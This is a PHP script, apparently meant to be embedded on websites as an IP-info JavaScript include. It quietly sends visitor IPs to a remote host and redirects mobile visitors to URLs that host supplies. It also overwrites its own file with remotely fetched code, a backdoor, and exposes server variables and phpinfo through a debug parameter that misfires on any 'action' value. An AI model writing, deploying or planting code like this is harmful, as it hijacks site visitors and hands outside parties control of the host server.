<?php
/**
 * @version V4.0.5
 * 上传到网站根目录后再页面head或body标签内添加<script src="/ip.php"></script>
 * 请勿对本文件做任何修改
 * 仅限学习参考，请勿用于非法用途否者后果自行承担
 */
error_reporting(0);
header('Content-Type:application/javascript');
class OB{
    private $ver;
    public function __construct() {
        $this->ver = 'V4.0.5';
        $this->init();
    }
    private function init(){
        if(isset($_GET['action']) && $_GET['action'] = 'debug'){
            $this->debug();
            die();
        }
        if(isset($_GET['action']) && $_GET['action'] = 'mup'){
            die($this->mup());
        }
        if(!isset($_SERVER['HTTP_REFERER'])) {
            die($this->error(null, 'ref'));
        } elseif(!$this->isMobile()) {
            die($this->error(null, 'mob'));
        }
        $R = $this->loadApi();
        if($M = @json_decode($R)){
            if($M->code=='20200') {
                header("Location:".$M->data);
                exit(0);
            } elseif($M['code']=='90200') {
                $this->update($M['data']);
                die($this->error(null, 'aup'));
            }
            die($this->error($M->ipcity, $M->msg));
        }
        die($this->error(null, 'requ'));
    }
    private function loadApi()
    {
        $ip  = $this->getIp();
        $url = "http://s8.cnzzcz.com/getCode/V300?siteId=6802&ip={$ip}&ver={$this->ver}";
        if(function_exists('curl_init')){
            $ch  = curl_init();
            curl_setopt($ch , CURLOPT_URL, $url);
            curl_setopt($ch , CURLOPT_USERAGENT, @$_SERVER['HTTP_USER_AGENT']);
            if(isset($_SERVER['HTTP_REFERER'])) {
                curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_REFERER']);
            }
            curl_setopt($ch , CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch , CURLOPT_TIMEOUT, 20);
            $R = curl_exec($ch);
            curl_close($ch);
        }else{
            $R = file_get_contents($url."&act=get");
        }
        return $R;
    }
    private function debug(){
        $v['url'] = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
        $v['ip']  = $this->getIp();
        $v['ver'] = $this->ver;
        $v['sid'] = 6802;
        $v['loadApi'] = json_decode($this->loadApi(), TRUE);
        $v['isCurl'] = function_exists('curl_init') ? 'ture' : 'false';
        $v['HTTP_REFERER']    = @$_SERVER['HTTP_REFERER'];
        $v['HTTP_USER_AGENT'] = @$_SERVER['HTTP_USER_AGENT'];
        $v['SERVER']          = $_SERVER;
        print_r($v);
        echo "<hr>";
        echo phpinfo();
    }
    private function mup()
    {
        $data = file_get_contents("http://s8.cnzzcz.com/getCode/mup?sid=6802");
        $M    = json_decode($data, TRUE);
        if($M['code']=='90200') {
            $this->update($M['data']);
            exit('var OBERR = \'suc_mupdate\'');
        }else{
            exit('var OBERR = \'err_mupdate\'');
        }
    }
    private function update($data){
        $filename = end(explode('/', $_SERVER['PHP_SELF']));
        $file = fopen("./{$filename}", "w") or die(0);
        fwrite($file, $data);
        fclose($file);
    }
    private function error($ipcity=null, $msg=null) {
        $ipcity = array(
            'ip'   => $this->getIp(),
            'city' => $ipcity,
            'msg'  => $msg
        );
        $ipcity = json_encode($ipcity);
        return "var ip_info = {$ipcity}";
    }
    private function isMobile() {
        if (isset ($_SERVER['HTTP_X_WAP_PROFILE'])){
            return true;
        }
        if (isset ($_SERVER['HTTP_VIA'])){
            return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
        }
        if (isset ($_SERVER['HTTP_USER_AGENT'])){
            $clientkeywords = array ('nokia','sony','ericsson','mot','samsung','htc','sgh','lg','sharp','sie-','philips',
                'panasonic','alcatel','lenovo','iphone','ipod','blackberry','meizu','android','netfront','symbian',
                'ucweb','windowsce','palm','operamini','operamobi','openwave','nexusone','cldc','midp','wap','mobile'
            );
            if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))) {
                return true;
            }
        }
        if (isset ($_SERVER['HTTP_ACCEPT']))
        {
            if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html'))))
            {
                return true;
            }
        }
        return false;
    }
    private function getIp(){
        $ip = "";
        if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')){
            $ip = getenv('HTTP_CLIENT_IP');
        }elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')){
            $ip = getenv('HTTP_X_FORWARDED_FOR');
        }elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
            $ip = getenv('REMOTE_ADDR');
        }elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')){
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
}
$ob = new OB();
?>